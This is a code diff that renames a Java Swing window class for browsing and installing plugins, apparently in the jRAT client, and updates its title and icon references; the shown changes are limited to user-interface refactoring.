@@ -39,11 +39,10 @@ import su.jrat.client.extensions.OnlinePlugin;
 import su.jrat.client.listeners.ExtensionInstallerListener;
 import su.jrat.client.net.WebRequest;
 import su.jrat.client.ui.dialogs.DialogImage;
-import su.jrat.common.Version;
 
 
 @SuppressWarnings("serial")
-public class FrameOnlinePlugins extends JFrame {
+public class FrameInstallPlugins extends JFrame {
 
 	private JPanel contentPane;
 	private JTable table;
@@ -56,9 +55,9 @@ public class FrameOnlinePlugins extends JFrame {
 	private JMenuItem mntmHelp;
 	private JMenuItem mntmPreview;
 
-	public FrameOnlinePlugins() {
-		setIconImage(Toolkit.getDefaultToolkit().getImage(FrameOnlinePlugins.class.getResource("/icons/application_large.png")));
-		setTitle("Browse Online Plugin Gallery - " + Version.getVersion());
+	public FrameInstallPlugins() {
+		setIconImage(Toolkit.getDefaultToolkit().getImage(FrameInstallPlugins.class.getResource("/icons/application_large.png")));
+		setTitle("Install Plugins");
 		setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
 		setBounds(100, 100, 725, 418);
 		contentPane = new JPanel();
@@ -148,7 +147,7 @@ public class FrameOnlinePlugins extends JFrame {
 				reload();
 			}
 		});
-		mntmReload.setIcon(new ImageIcon(FrameOnlinePlugins.class.getResource("/icons/update.png")));
+		mntmReload.setIcon(new ImageIcon(FrameInstallPlugins.class.getResource("/icons/update.png")));
 		popupMenu.add(mntmReload);
 
 		mntmHelp = new JMenuItem("Help");
@@ -173,9 +172,9 @@ public class FrameOnlinePlugins extends JFrame {
 				}
 			}
 		});
-		mntmPreview.setIcon(new ImageIcon(FrameOnlinePlugins.class.getResource("/icons/images-stack.png")));
+		mntmPreview.setIcon(new ImageIcon(FrameInstallPlugins.class.getResource("/icons/images-stack.png")));
 		popupMenu.add(mntmPreview);
-		mntmHelp.setIcon(new ImageIcon(FrameOnlinePlugins.class.getResource("/icons/help.png")));
+		mntmHelp.setIcon(new ImageIcon(FrameInstallPlugins.class.getResource("/icons/help.png")));
 		popupMenu.add(mntmHelp);
 		scrollPane.setViewportView(table);
 
